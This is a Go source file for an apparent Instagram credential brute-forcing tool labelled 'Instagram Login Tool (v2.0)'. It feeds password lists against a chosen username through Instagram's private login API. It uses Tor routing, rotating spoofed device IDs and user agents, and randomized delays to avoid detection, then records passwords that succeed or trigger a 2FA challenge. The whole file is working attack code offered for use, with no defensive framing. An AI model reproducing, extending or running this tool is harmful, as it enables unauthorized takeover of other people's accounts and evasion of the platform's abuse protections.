/* coded by @monsmain
⚠️NOTE EN:
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
*/
package main

import (
	"bufio"
	"compress/gzip"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
	"golang.org/x/net/proxy"
)

const (
	API_URL            = "https://i.instagram.com/api/v1/"
	TIMEOUT            = 20 * time.Second
	CURRENT_USER       = "monsmain"
	IG_APP_ID          = "567067343352427"
	IG_BLOKS_VERSIONID = "2fb68e1b10e8ec4ce874193c87cdbeb39b6be34200cdc15664782eed8dbd366f"
	WORKER_COUNT       = 2
	RATE_LIMIT_MIN     = 5
	RATE_LIMIT_MAX     = 12
)

var userAgents = []string{
	//Android
	"Instagram 371.0.0.36.89 Android (33/14; 420dpi; 1080x2340; samsung; SM-A546E; a54; qcom; en_US; 706838827)",
	"Instagram 370.0.0.26.109 Android (32/12; 440dpi; 1080x2400; Xiaomi; M2101K6G; sweet; qcom; en_US; 703402950)",
	"Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)",
	"Instagram 365.0.0.40.94 Android (34/14; 420dpi; 1080x2115; samsung; SM-G990W; r9q; qcom; en_CA; 690234877)",
	"Instagram 318.0.7.22.109 Android (29/10; 320dpi; 720x1384; samsung; SM-G960W; starqltecs; qcom; en_CA; 690234910)",
	"Instagram 365.0.0.40.94 Android (34/14; 450dpi; 1080x2301; samsung; SM-A146U; a14xm; mt6833; en_US; 690234900; IABMV/1)",
	"Instagram 365.0.0.40.94 Android (34/14; 420dpi; 1080x2115; samsung; SM-G990W; r9q; qcom; en_CA; 690234877)",
	"Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743",
	"Instagram 141.0.0.17.118 Android (29/10; 450dpi; 1080x2192; samsung; SM-G986U; y2q; qcom; en_US; 213368022)",
	"Instagram 329.0.0.29.120 Android (31/12; 420dpi; 1080x2400; samsung; SM-A515F; a51; exynos9611; en_US; 329000029)",
	"Instagram 328.0.0.13.119 Android (31/12; 480dpi; 1080x2400; samsung; SM-A715F; a71; qcom; en_US; 328000013)",
	"Instagram 330.0.0.23.108 Android (31/12; 480dpi; 1080x2400; samsung; SM-A525F; a52; qcom; en_US; 330002310)",
	"Instagram 330.0.0.23.108 Android (30/11; 420dpi; 1080x2340; Xiaomi; M2007J20CG; gauguin; qcom; en_US; 330002310)",
	"Instagram 327.0.0.20.123 Android (30/11; 420dpi; 1080x2400; realme; RMX3371; RMX3371; qcom; en_US; 327000020)",
	"Instagram 372.0.0.48.60 Android (34/14; 450dpi; 1080x2222; samsung; SM-S928N; e3q; qcom; vi_VN; 709818009)",
	"Instagram 352.1.0.41.100 Android (31/12; 420dpi; 1080x2047; samsung; SM-G975F; beyond2; exynos9820; in_ID; 650753877)",
	"Instagram 350.1.0.46.93 Android (31/12; 480dpi; 1080x2051; samsung; SM-N976N; d2x; exynos9825; ko_KR; 645441462)",
	"Instagram 357.1.0.52.100 Android (34/14; 450dpi; 1080x2127; samsung; SM-S926N; e2s; s5e9945; ko_KR; 662944209)",
	"Instagram 349.3.0.42.104 Android (34/14; 420dpi; 1080x2133; samsung; SM-S911N; dm1q; qcom; ko_KR; 643237792)",
	//iOS
	"Instagram 235.1.0.24.107 (iPhone12,1; iOS 18_1_1; en_US; en-US; scale=2.21; 828x1792; 370368062) NW/3",
	"Instagram 279.0.0.17.112 (iPhone12,5; iOS 18_1_1; en_US; en-US; scale=3.00; 1242x2688; 465757305)",
	"Instagram 313.0.2.9.339 (iPad7,6; iOS 14_7_1; en_US; en; scale=2.00; 750x1334; 553462334)",
	"Instagram 337.0.2.24.92 (iPhone14,6; iOS 17_4_1; en_US; en; scale=2.00; 750x1334; 614064327)",
	"Instagram 365.0.0.33.88 (iPad7,5; iPadOS 17_6; en_US; en; scale=2.00; 750x1334; 690008027; IABMV/1) NW/3",
	"Instagram 315.1.2.21.112 (iPhone13,2; iOS 18_1_1; ru_US; ru; scale=3.00; 1170x2532; 559614958) NW/1",
}

func clearTerminal() {
	if strings.Contains(strings.ToLower(runtime.GOOS), "windows") {
		cmd := exec.Command("cmd", "/c", "cls")
		cmd.Stdout = os.Stdout
		cmd.Run()
	} else {
		cmd := exec.Command("clear")
		cmd.Stdout = os.Stdout
		cmd.Run()
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	clearTerminal()
	setupLogger()
	fmt.Println(" ***Instagram Login Tool (v2.0)*** ")
	fmt.Printf("coded by: %s\n\n", CURRENT_USER)
	fmt.Println("\nChecking Public IPs...\n")

	ipDirect, errDirect := getPublicIP(&http.Client{Timeout: 10 * time.Second})
	ipTor, torOK := getTorIP()

	if errDirect != nil {
		fmt.Println("Error getting direct IP:", errDirect)
	} else {
		fmt.Println("[Direct] Public IP:", ipDirect)
	}

	if torOK {
		fmt.Println("[TOR]    Public IP:", ipTor)
		if errDirect == nil && ipDirect != ipTor {
			fmt.Println("TOR is working (IP changed)\n")
		} else {
			fmt.Println("TOR is NOT working (IP did not change)\n")
		}
	} else {
		fmt.Println("[TOR]    Unable to connect through TOR. (TOR is NOT working)\n")
	}

	useTor := torOK

	if useTor {
		fmt.Println("tor is active...\n")
	} else {
		fmt.Println("TOR is not active , direct connection is active\n")
	}

	mode := selectMode()
	var passwords []string

	if mode == 1 {
		passwords = loadPasswordsAuto()
	} else {
		passwords = loadPasswordsManual()
	}

	if len(passwords) == 0 {
		fmt.Println("No passwords found!")
		return
	}

	fmt.Printf("\nLoaded %d passwords\n", len(passwords))

	username := getUsername()
	if username == "" {
		fmt.Println("Username is empty!")
		return
	}

	fmt.Println("\nStarting login attempts...\n")
	found := make(chan LoginResult, 1)
	progress := make(chan int, len(passwords))
	var wg sync.WaitGroup

	jobs := make(chan string, len(passwords))
	for i := 0; i < WORKER_COUNT; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for password := range jobs {
				res := tryLogin(username, password, useTor)
				progress <- 1
				if res.Success {
					select {
					case found <- res:
					default:
					}
					return
				}
				time.Sleep(randomDuration(RATE_LIMIT_MIN, RATE_LIMIT_MAX))
			}
		}()
	}

	go func() {
		for _, password := range passwords {
			jobs <- password
		}
		close(jobs)
	}()

	go showProgressBar(len(passwords), progress)

	select {
	case res := <-found:
		fmt.Println("✅ The correct password was found! (2FA/Challenge Required)")
		fmt.Printf("Username: %s\n", username)
		fmt.Printf("\n✅ Correct password: %s\n", res.Password)
		saveResultJSON(res)
	case <-waitGroupTimeout(&wg, 60*time.Minute):
		fmt.Println("\n❌ Password not found.")
		saveResultJSON(LoginResult{
			Username: username,
			Password: "",
			Success:  false,
			Time:     time.Now().Format("2006-01-02 15:04:05"),
			Message:  "Not found",
		})
	}
}

func selectMode() int {
	reader := bufio.NewReader(os.Stdin)
	fmt.Println("Choose attack mode:")
	fmt.Println("[1] AUTO ATTACK (use default passwords)")
	fmt.Println("[2] MANUAL ATTACK (use your own password file)")
	fmt.Print("Enter your choice (1 or 2): ")
	for {
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		if input == "1" || input == "2" {
			if input == "1" {
				return 1
			} else {
				return 2
			}
		}
		fmt.Print("Invalid choice. Please enter 1 or 2: ")
	}
}

func loadPasswordsAuto() []string {
	return loadPasswordsFromFiles("password.txt", "password.json")
}


func loadPasswordsManual() []string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter your password file path: ")
	filePath, _ := reader.ReadString('\n')
	filePath = strings.TrimSpace(filePath)
	return loadPasswordsFromFiles(filePath, "")
}

func loadPasswordsFromFiles(txtFile string, jsonFile string) []string {
	var passwords []string
	if txtFile != "" {
		file, err := os.Open(txtFile)
		if err == nil {
			defer file.Close()
			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				pass := strings.TrimSpace(scanner.Text())
				if pass != "" {
					passwords = append(passwords, pass)
				}
			}
		} else {
			log.Printf("Error opening password file: %v", err)
		}
	}
	if jsonFile != "" {
		fileJSON, errj := os.Open(jsonFile)
		if errj == nil {
			defer fileJSON.Close()
			var jsonPasswords []string
			decoder := json.NewDecoder(fileJSON)
			if err := decoder.Decode(&jsonPasswords); err == nil {
				passwords = append(passwords, jsonPasswords...)
			}
		}
	}
	return passwords
}

func getPublicIP(client *http.Client) (string, error) {
	resp, err := client.Get("https://api.ipify.org")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	ip, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(ip), nil
}

func getTorIP() (string, bool) {
	socksProxy := "127.0.0.1:9050"
	dialer, err := proxy.SOCKS5("tcp", socksProxy, nil, proxy.Direct)
	if err != nil {
		return "", false
	}
	transport := &http.Transport{Dial: dialer.Dial}
	client := &http.Client{
		Transport: transport,
		Timeout:   15 * time.Second,
	}
	ip, err := getPublicIP(client)
	if err != nil {
		return "", false
	}
	return ip, true
}

func setupLogger() {
	logFile, err := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		log.SetOutput(logFile)
	}
}

func getUsername() string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter Instagram username: ")
	username, _ := reader.ReadString('\n')
	return trim(username)
}

func showProgressBar(total int, progress <-chan int) {
	completed := 0
	for range progress {
		completed++
		printProgress(completed, total)
	}
}

func waitGroupTimeout(wg *sync.WaitGroup, timeout time.Duration) <-chan struct{} {
	done := make(chan struct{})
	go func() {
		c := make(chan struct{})
		go func() {
			wg.Wait()
			close(c)
		}()
		select {
		case <-c:
		case <-time.After(timeout):
		}
		close(done)
	}()
	return done
}

type deviceInfo struct {
	deviceID   string
	androidID  string
	phoneID    string
	adid       string
	guid       string
	userAgent  string
}

func randomHex(length int) string {
	const hex = "0123456789abcdef"
	b := make([]byte, length)
	for i := range b {
		b[i] = hex[rand.Intn(len(hex))]
	}
	return string(b)
}

func randomUUID() string {
	return fmt.Sprintf("%s-%s-%s-%s-%s",
		randomHex(8), randomHex(4), randomHex(4), randomHex(4), randomHex(12))
}

func randomDeviceInfo() deviceInfo {
	id := randomUUID()
	return deviceInfo{
		deviceID:   id,
		androidID:  fmt.Sprintf("android-%s", randomHex(16)),
		phoneID:    randomUUID(),
		adid:       randomUUID(),
		guid:       randomUUID(),
		userAgent:  userAgents[rand.Intn(len(userAgents))],
	}
}

func buildHeaders(dev deviceInfo) map[string]string {
	return map[string]string{
		"User-Agent":                dev.userAgent,
		"Content-Type":              "application/x-www-form-urlencoded; charset=UTF-8",
		"Accept":                    "*/*",
		"Accept-Language":           "en-US",
		"Accept-Encoding":           "gzip, deflate, br",
		"X-IG-Capabilities":         "3brTvw==",
		"X-IG-Connection-Type":      "WIFI",
		"X-IG-App-ID":               IG_APP_ID,
		"X-IG-Bloks-Version-Id":     IG_BLOKS_VERSIONID,
		"X-IG-Device-ID":            dev.deviceID,
		"X-IG-Android-ID":           dev.androidID,
		"X-IG-Phone-ID":             dev.phoneID,
		"X-IG-Ad-ID":                dev.adid,
		"X-FB-HTTP-Engine":          "Liger",
		"X-FB-Client-IP":            "True",
		"X-FB-Server-Cluster":       "True",
	}
}

type InstagramResponse struct {
	Status     string `json:"status"`
	Message    string `json:"message"`
	ErrorType  string `json:"error_type"`
	ErrorTitle string `json:"error_title"`
	Challenge  struct {
		URL string `json:"url"`
	} `json:"challenge"`
}

type LoginResult struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Success  bool   `json:"success"`
	Time     string `json:"time"`
	Message  string `json:"message"`
}

func tryLogin(username, password string, useTor bool) LoginResult {
	loginUrl := API_URL + "accounts/login/"
	dev := randomDeviceInfo()
	data := url.Values{}
	data.Set("username", username)
	data.Set("enc_password", fmt.Sprintf("#PWD_INSTAGRAM_BROWSER:0:%d:%s", time.Now().Unix(), password))
	data.Set("device_id", dev.deviceID)
	data.Set("uuid", dev.guid)
	data.Set("adid", dev.adid)
	data.Set("phone_id", dev.phoneID)
	data.Set("login_attempt_count", fmt.Sprintf("%d", rand.Intn(3)))

	var client *http.Client
	if useTor {
		dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
		if err == nil {
			transport := &http.Transport{Dial: dialer.Dial}
			client = &http.Client{Transport: transport, Timeout: TIMEOUT}
		} else {
			client = &http.Client{Timeout: TIMEOUT}
		}
	} else {
		client = &http.Client{Timeout: TIMEOUT}
	}

	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Error creating request: %v\n", err)
		fmt.Println("Error creating request:", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Request error"}
	}

	for k, v := range buildHeaders(dev) {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending request: %v\n", err)
		fmt.Println("Error sending request:", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "HTTP error"}
	}
	defer resp.Body.Close()

	var reader io.Reader
	if resp.Header.Get("Content-Encoding") == "gzip" {
		gzipr, err := gzip.NewReader(resp.Body)
		if err != nil {
			log.Printf("Error reading gzip response: %v\n", err)
			fmt.Println("Error reading gzip response:", err)
			return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Gzip read error"}
		}
		defer gzipr.Close()
		reader = gzipr
	} else {
		reader = resp.Body
	}

	body, err := io.ReadAll(reader)
	if err != nil {
		log.Printf("Error reading response: %v\n", err)
		fmt.Println("Error reading response:", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Read error"}
	}

	bodyStr := strings.TrimSpace(string(body))
	log.Printf("Raw response: %s\n", bodyStr)

	if !strings.HasPrefix(bodyStr, "{") {
		log.Printf("Non-JSON response: %s\n", bodyStr)
		fmt.Println("Non-JSON response:", bodyStr)
		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Non-JSON response"}
	}

	var response InstagramResponse
	if err := json.Unmarshal(body, &response); err != nil {
		log.Printf("Error parsing response: %v\n", err)
		fmt.Println("Error parsing response:", err)
		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Parse error"}
	}

	success := response.Status == "ok" || strings.Contains(bodyStr, "logged_in_user")

	if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
		return LoginResult{Username: username, Password: password, Success: true, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "challenge or success"}
	}

	msg := response.Message
	if response.ErrorType == "bad_password" {
		msg = "invalid password"
	}
	if response.ErrorType == "invalid_user" {
		msg = "invalid username"
	}
	return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: msg}
}

func saveResultJSON(result LoginResult) {
	file, err := os.OpenFile("results.json", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Error saving result: %v", err)
		return
	}
	defer file.Close()

	enc := json.NewEncoder(file)
	err = enc.Encode(result)
	if err != nil {
		log.Printf("Error encoding result: %v", err)
	}
}

func trim(s string) string {
	return strings.TrimSpace(s)
}

func printProgress(current, total int) {
	percent := (current * 100) / total
	bar := strings.Repeat("█", percent/2) + strings.Repeat("-", 50-percent/2)
	os.Stdout.WriteString(
		"\r[" + bar + "] " +
			fmt.Sprintf(" %d/%d ", current, total) +
			fmt.Sprintf(" %d%%", percent))
	if current == total {
		os.Stdout.WriteString("\n")
	}
}

func randomDuration(min, max int) time.Duration {
	return time.Duration(rand.Intn(max-min+1)+min) * time.Second
}
